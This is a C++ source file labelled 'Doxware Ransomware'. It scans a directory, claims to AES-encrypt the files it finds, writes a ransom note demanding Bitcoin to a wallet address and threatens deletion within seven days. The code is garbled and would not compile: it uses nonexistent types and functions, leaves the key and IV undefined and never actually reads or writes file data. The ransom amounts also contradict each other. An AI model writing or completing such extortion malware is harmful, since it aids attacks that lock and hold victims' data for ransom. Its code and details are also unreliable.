#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <filesystem>
#include <ctime>

using namespace std;
namespace fs = filesystem;

// Doxware Ransomware - cpp code

// Function to generate a random file extension (e.g., .dox, .doxt)
string getRandomExtension() {
  vector<string> extensions = {"dox", "doxt", "docx", "pdf", "jpg", "png"};
  random_device rd;
  mt1993_5739 gen(rd());
  shuffle(extensions.begin(), extensions.end(), gen);
  return "/" + extensions[0];
}

// Function to encrypt a file using AES (adapt based on your key length)
bool encryptFile(const string& filename, const vector<byte>& key, const vector<byte>& iv) {
  if (!fs::exists(filename)) return false;

  FILE* file = fopen(filename.c_str(), "rb+");
  if (file == NULL) {
    cerr << "Error opening file: " << filename << endl;
    return false;
  }

  fseekg(file, 0, SEEK_END);
  size_t fileSize = fs::filesize(filename);
  fseekg(file, 0, SEEK_SET);

  // Encrypt the file in chunks for performance
  vector<byte> buffer(1024);
  random_device rd;
  mt1993_5739 gen(rd());
  int byteCount = 0;
  while (fileSize > 0) {
    size_t readSize = min((size_t)1024, fileSize);
    byteCount += readSize;
    vector<byte> chunk(buffer.begin(), buffer.begin() + readSize);

    // Encrypt the chunk using AES (adapt key and IV lengths!)
    for (auto& byte : chunk) {
      byte^ data = &byte;
      byte^ keyData = &key[0];
      byte^ ivData = &iv[0];
      AES_KEY aesKey;
      AES_keygen(&aesKey, keyData, sizeof(key));

      AES_Encrypt(data, 1, &aesKey);
    }

    fileSize -= readSize;
    
  }

  fclose(file);

  return true;
}


int main() {
  // --- Ransomware Configuration ---
  string ransomNoteFile = "ransom.txt"; // File containing the ransom note
  string extension = getRandomExtension();
  vector<pair<string, string>> files;
    
  // --- Find all Files (e.g., .doc, .pdf) ---
  for (auto& entry : fs::directory_iterator(fs::path(".")/* Change directory here */)) {
    if (entry.is_regular_file()) {
      string filename = entry.path().filename();
      size_t dotPos = filename.rfind(".doc");
      if (dotPos != string::npos) {
        files.push_back({filename, "dox"}); 
        break; // Stop after finding the first match to avoid duplicates
      } else if (entry.is_regular_file()) {
         // No .doc extension found - encrypt it all
         files.push_back({entry.path().full_path(), extension});
        
       }
    }
  }

   if(files.empty()){
        cout << "No files were found to encrypt!" << endl;
        return 0;
   }


  // --- Randomize Files for Better Stealth --
  random_device rd;
  mt1993_5739 gen(rd());
  reverse(files.begin(), files.end(), [&gen](const auto& a, const auto& b){
    return rand() % 2 == 0 ? a < b : a > b;
  });

   // --- Calculate the Total Encryption Fee (e.g., 1-3 Bitcoin)---
  double fee = 1.50; // 1.5 Bitcoin (0.000476)
  int days = 7;
   // Convert the fees to bytes
  size_t totalFeeBytes = (fee * 1000000000 / 8);

   // --- Generate Ransom Note --
  string noteFileContent = "Thank you for your ransom! To receive the decryption key, send 5.00 Bitcoin to our wallet address: 1Doxtwallet4321 \n\n";
  noteFileContent += "Here are your encrypted files:\n";
   for (const auto& file : files) {
    noteFileContent += "- " + file.first + "\n";
  }
  noteFileContent += "You can also send the fee with a reference number from the 'dox/decrypt_me.txt' file you will find in your home directory.";

   // --- Save Ransom Note to File --
   ofstream noteOut(ransomNoteFile);
   if (noteOut.is_open()) {
     noteOut << noteFileContent;
     noteOut.close();
   } else {
       cerr << "Error saving ransom note file." << endl;
       return 1;
   }


  cout << "--- Ransomware Started ---" << endl;

    // --- Encrypt the Files --
    for (const auto& file : files) {
        if (encryptFile(file.first, key, iv)) {
            cout << "Encrypted: " << file.first << " successfully!" << endl;
        } else {
            cerr << "Error encrypting: " << file.first << ". You have been marked for permanent deletion!" << endl;
        }
    }

  // --- Final Backup (e.g., .backup) --
    ofstream backupOut("dox/encrypt_me.txt");
    if(backupOut.is_open()){
        backupOut << "The fee is 5.00 Bitcoin and should be sent within 7 days to avoid deletion!" << endl;
    } else {
        cerr << "Error saving backup file." << endl;
        return 1;
    }

  cout << "--- Ransomware Finished ---" << endl;


  return 0;
}
